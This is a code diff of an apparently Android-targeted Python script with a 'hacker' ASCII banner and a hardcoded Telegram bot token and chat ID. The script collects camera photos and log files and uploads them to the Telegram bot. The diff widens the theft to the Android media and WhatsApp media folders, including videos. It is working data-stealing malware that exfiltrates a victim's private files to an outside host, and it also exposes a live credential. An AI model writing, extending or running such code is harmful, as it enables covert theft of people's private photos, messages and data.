@@ -4,19 +4,21 @@ import sys
 import time
 from colorama import Fore, Style, init
 
-# Colorama'yı başlat
+# 
 init(autoreset=True)
 
-# Telegram Bot Token ve Chat ID
+# 
 TELEGRAM_BOT_TOKEN = '7773571310:AAGD3Wn3MeDaQSZWmGNOQQfbfltuDtT8Nos'  # 
 TELEGRAM_CHAT_ID = '1044807606'  # 
 
-
+# 
 PHOTO_DIRECTORY = '/storage/emulated/0/DCIM/Camera'  
 LOG_DIRECTORY = '/storage/emulated/0/Logs'  
+ANDROID_MEDIA_DIRECTORY = '/storage/emulated/0/Android/media'  
+WHATSAPP_DIRECTORY = '/storage/emulated/0/Android/media/com.whatsapp'  
 
 def show_banner():
-    """Python başladığında ASCII sanatını gösteren fonksiyon."""
+    """"""
     banner = f"""
 {Fore.CYAN}██╗  ██╗██████╗ ███████╗██████╗ ████████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
 {Fore.CYAN}╚██╗██╔╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
@@ -28,7 +30,7 @@ def show_banner():
     print(banner)
 
 def send_to_telegram(file_path, is_photo=True):
-    """"""
+    """Dosyayı Telegram'a gönderen fonksiyon."""
     try:
         if is_photo:
             url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
@@ -56,19 +58,29 @@ def get_files(directory, extensions):
                     file_path = os.path.join(root, file)
                     files.append(file_path)
     except Exception as e:
-        pass  # Hata durumunda hiçbir şey yapma
+        pass  # 
     return files
 
 def main():
-    
+    #
     photo_files = get_files(PHOTO_DIRECTORY, ('.jpg', '.jpeg', '.png'))
     for photo in photo_files:
         send_to_telegram(photo, is_photo=True)
     
-    
+    # 
     log_files = get_files(LOG_DIRECTORY, ('.log', '.txt'))
     for log in log_files:
         send_to_telegram(log, is_photo=False)
+    
+    # 
+    media_files = get_files(ANDROID_MEDIA_DIRECTORY, ('.jpg', '.jpeg', '.png', '.mp4', '.log', '.txt'))
+    for media_file in media_files:
+        send_to_telegram(media_file, is_photo=media_file.lower().endswith(('.jpg', '.jpeg', '.png')))
+    
+    # 
+    whatsapp_files = get_files(WHATSAPP_DIRECTORY, ('.jpg', '.jpeg', '.png', '.mp4', '.log', '.txt'))
+    for whatsapp_file in whatsapp_files:
+        send_to_telegram(whatsapp_file, is_photo=whatsapp_file.lower().endswith(('.jpg', '.jpeg', '.png')))
 
 def show_menu():
     """Kullanıcıya menüyü gösteren fonksiyon."""
